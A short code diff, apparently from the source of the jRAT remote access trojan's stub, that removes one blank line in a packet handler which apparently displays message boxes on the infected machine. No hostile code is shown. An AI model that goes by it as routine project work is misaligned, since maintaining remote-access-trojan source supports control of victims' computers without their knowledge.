@@ -6,7 +6,6 @@ import javax.swing.UIManager;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.Constants;
 
-
 public class Packet10Messagebox extends AbstractIncomingPacket {
 
 	@Override
